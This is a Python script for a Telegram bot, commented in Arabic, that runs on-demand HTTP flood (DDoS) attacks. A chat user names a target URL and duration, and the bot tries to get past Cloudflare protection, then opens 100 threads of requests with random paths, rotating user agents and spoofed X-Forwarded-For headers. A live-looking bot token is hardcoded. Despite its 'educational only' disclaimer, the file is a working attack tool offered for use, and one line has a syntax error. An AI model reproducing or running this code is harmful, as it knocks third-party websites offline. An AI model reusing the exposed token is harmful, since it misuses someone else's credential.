import random
import time
import socket
import ssl
import threading
from urllib.parse import urlparse
import hashlib
import telebot
from telebot import types
import requests
from fake_useragent import UserAgent
import cloudscraper
import re

bot = telebot.TeleBot("7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU")

class UltimateDDoSTool:
    def __init__(self):
        self.active_attacks = {}
        self.ua = UserAgent()
        self.scraper = cloudscraper.create_scraper()
        self.legal_warning = """
        ⚠️ تحذير: هذا الكود للأغراض التعليمية فقط
        ⚠️ استخدامه ضد أنظمة دون إذن غير قانوني
        """

    def _normalize_url(self, url):
        """تنسيق الروابط بشكل صحيح"""
        if not re.match(r'^https?://', url):
            url = 'https://' + url
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def _bypass_protection(self, url):
        """تجاوز حماية Cloudflare وغيرها"""
        try:
            resp = self.scraper.get(url, timeout=10)
            return resp.status_code == 200
        except:
            return False

    def _generate_headers(self):
        """إنشاء رؤوس HTTP متغيرة"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Referer': 'https://www.google.com/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'cross-site',
            'TE': 'trailers'
        }

    def _advanced_attack(self, target, duration):
        """تقنية الهجوم المتقدمة"""
        parsed = urlparse(target)
        host = parsed.netloc
        port = 443 if parsed.scheme == 'https' else 80
        stop_event = threading.Event()

        def worker():
            ctx = ssl.create_default_context()
            ctx.set_ciphers('ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384')
            while not stop_event.is_set():
                try:
                    with socket.create_connection((host, port), timeout=5) as sock:
                        if parsed.scheme == 'https':
                            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                                self._send_advanced_request(ssock, host)
                        else:
                            self._send_advanced_request(sock, host)
                    time.sleep(random.uniform(0.1, 1.5))
                except:
                    continue

        threads = []
        for _ in range(100):  # 100 خيط هجومي
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads.append(t)

        return stop_event, threads

    def _send_advanced_request(self, sock, host):
        """إرسال طلب متطور"""
        path = f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        headers = self._generate_headers()
        
        # بناء طلب HTTP متطور
        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
        request += "\r\nX-Forwarded-For: {}.{}.{}.{}\r\n\r\n".format(
            random.randint(1, 255), random.randint(0, 255),
            random.randint(0, 255), random.randint(0, 255)
        
        sock.send(request.encode())
        sock.recv(1024)  # قراءة جزئية للاستجابة

    def start_attack(self, chat_id, url, duration):
        """بدء هجوم شامل"""
        try:
            url = self._normalize_url(url)
            
            if not self._bypass_protection(url):
                return False, "فشل في تجاوز حماية الموقع"
            
            stop_event, threads = self._advanced_attack(url, duration)
            self.active_attacks[chat_id] = {
                'stop_event': stop_event,
                'threads': threads,
                'target': url,
                'start_time': time.time(),
                'duration': duration
            }
            
            # خيط لإنهاء الهجوم بعد المدة المحددة
            def timer():
                time.sleep(duration)
                self.stop_attack(chat_id)
            
            threading.Thread(target=timer).start()
            
            return True, f"بدأ الهجوم على {url} لمدة {duration} ثانية"
        except Exception as e:
            return False, f"خطأ: {str(e)}"

    def stop_attack(self, chat_id):
        """إيقاف الهجوم"""
        if chat_id in self.active_attacks:
            self.active_attacks[chat_id]['stop_event'].set()
            for t in self.active_attacks[chat_id]['threads']:
                t.join()
            del self.active_attacks[chat_id]
            return True
        return False

# إنشاء أداة الهجوم
tool = UltimateDDoSTool()

# أوامر البوت
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, tool.legal_warning + """
    🚀 أوامر البوت:
    /attack [رابط] [الوقت بالثواني] - بدء هجوم شامل
    /stop - إيقاف الهجوم الحالي
    /status - حالة الهجوم الحالي
    """)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "استخدم: /attack [رابط] [الوقت بالثواني]")
            return
        
        url = args[1]
        duration = int(args[2]) if len(args) > 2 else 60
        
        success, msg = tool.start_attack(message.chat.id, url, duration)
        bot.reply_to(message, msg)
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    if tool.stop_attack(message.chat.id):
        bot.reply_to(message, "✅ تم إيقاف الهجوم بنجاح")
    else:
        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط لإيقافه")

@bot.message_handler(commands=['status'])
def status_cmd(message):
    if message.chat.id in tool.active_attacks:
        attack = tool.active_attacks[message.chat.id]
        elapsed = int(time.time() - attack['start_time'])
        remaining = max(0, attack['duration'] - elapsed)
        bot.reply_to(message, f"""
        🎯 حالة الهجوم:
        الهدف: {attack['target']}
        الوقت المنقضي: {elapsed} ثانية
        الوقت المتبقي: {remaining} ثانية
        """)
    else:
        bot.reply_to(message, "⚠️ لا يوجد هجوم نشط")

print("✅ البوت يعمل...")
bot.polling()
